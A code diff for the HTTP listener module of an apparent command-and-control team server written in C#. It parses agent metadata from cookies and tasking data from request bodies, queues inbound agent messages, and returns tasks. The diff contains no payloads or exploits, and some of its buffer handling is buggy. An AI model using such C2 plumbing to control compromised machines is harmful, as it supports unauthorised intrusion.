@@ -1,5 +1,7 @@
 ﻿using AgentCore;
 using AgentCore.Models;
+using Common;
+using Common.Models;
 using Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure;
 using System;
 using System.Collections.Generic;
@@ -18,19 +20,25 @@ using TeamServer.Models;
 
 namespace TeamServer.Modules
 {
+    
+
     public class StateObject
     {
         public Socket workSocket = null;
         public const int BufferSize = 1024;
         public byte[] buffer = new byte[BufferSize];
+        public byte[] data = null;
+
     }
 
     public class HTTPCommModule : ICommModule
     {
+        
         public ListenerHttp Listener { get; set; }
         private Socket Socket { get; set; }
 
         public ModuleStatus ModuleStatus { get; private set; } = ModuleStatus.Stopped;
+        private Queue<(Metadata, C2Data)> InboundQueue { get; set; } = new Queue<(Metadata, C2Data)>();
         private byte[] PrependData { get; set; } = new byte[] { };
         private byte[] AppenedData { get; set; } = new byte[] { };
 
@@ -66,9 +74,9 @@ namespace TeamServer.Modules
                     }
                 });
             }
-            catch 
+            catch (Exception e)
             {
-
+                throw new Exception(e.Message);
             }
         }
 
@@ -88,6 +96,7 @@ namespace TeamServer.Modules
 
         private void ReadCallback(IAsyncResult ar)
         {
+            /*
             var state = ar.AsyncState as StateObject;
             var handler = state.workSocket;
             var bytesRead = handler.EndReceive(ar);
@@ -104,6 +113,68 @@ namespace TeamServer.Modules
                 SendData(handler, transformedData); //new
                 //SendData(handler, data);
             }
+            */
+
+            
+            var state = ar.AsyncState as StateObject;
+            var handler = state.workSocket;
+            var bytesRead = 0;
+
+            try
+            {
+                bytesRead = handler.EndReceive(ar);
+            }
+            catch (SocketException)
+            {
+                // client socket has gone away for "reason" 
+            }
+            if (bytesRead > 0)
+            {
+                //var dataReceived = state.buffer.TrimBytes();
+                var dataReceived = TrimBytes(state.buffer);
+                var webRequest = Encoding.UTF8.GetString(dataReceived);
+
+                if (webRequest.Contains("Expect: 100-continue") || dataReceived.Length == state.buffer.Length)
+                {
+                    state.data = new byte[dataReceived.Length];
+                    Array.Copy(dataReceived, state.data, dataReceived.Length);
+                    Array.Clear(state.buffer, 0, state.buffer.Length);
+                    handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
+                }
+                else
+                {
+                    var final = new byte[state.data.Length + dataReceived.Length];
+                    Buffer.BlockCopy(state.data, 0, final, 0, state.data.Length);
+                    Buffer.BlockCopy(dataReceived, 0, final, state.data.Length, dataReceived.Length);
+
+                    var finalRequest = Encoding.UTF8.GetString(final);
+
+                    var metadata = ExtractMetadata(finalRequest);
+                    if (metadata != null) //valid agent
+                    {
+                        var c2Data = ExtractC2Data(finalRequest);
+                        if (c2Data != null)
+                        {
+                            InboundQueue.Enqueue((metadata, c2Data));
+                        }
+
+                        var agentTasks = GetAgentTask(dataReceived);
+                        var transformedData = TransformOutputData(agentTasks);
+                        SendData(handler, transformedData);
+                    }
+                }
+            }
+
+
+        }
+
+        private byte[] TrimBytes(byte[] bytes)
+        {
+            var index = bytes.Length - 1;
+            while (bytes[index] == 0) { index--; }
+            byte[] copy = new byte[index + 1];
+            Array.Copy(bytes, copy, index + 1);
+            return copy;
         }
 
         private void SendData(Socket handler, byte[] dataReceived)
@@ -221,13 +292,24 @@ namespace TeamServer.Modules
             return bytes.ToArray();
         }
 
+        private C2Data ExtractC2Data(string webRequest)
+        {
+            C2Data c2Data = null;
+
+            var regex = Regex.Match(webRequest, "Data=([^\\s].*)");
+            if (regex.Captures.Count > 0)
+            {
+                c2Data = Serialisation.DeserialiseData<C2Data>(Convert.FromBase64String(regex.Groups[1].Value.Replace("\0","")));
+            }
+            return c2Data;
+        }
         private Metadata ExtractMetadata(string webRequest)
         {
             Metadata metadata = null;
             var regex = Regex.Match(webRequest, "Cookie: ([^\\s].*)");
             if (regex.Captures.Count > 0)
             {
-                metadata = AgentCore.Helpers.DeserialiseData<Metadata>(Convert.FromBase64String(regex.Groups[1].Value));
+                metadata = Serialisation.DeserialiseData<Metadata>(Convert.FromBase64String(regex.Groups[1].Value));
             }
             return metadata;
         }
@@ -253,6 +335,28 @@ namespace TeamServer.Modules
             Socket.Close();
             //Socket.Close();
             //Socket.Dispose();
+        }
+        //public bool SendData(C2Data data)
+        //{
+        //    //do stuff
+        //}
+
+
+
+        public bool RecvData(out Metadata metadata, out C2Data data)
+        {
+            if (InboundQueue.Count > 0)
+            {
+                var tuple = InboundQueue.Dequeue();
+                metadata = tuple.Item1;
+                data = tuple.Item2;
+
+                return true;
+            }
+
+            metadata = null;
+            data = null;
+            return false;
         }
     }
 }
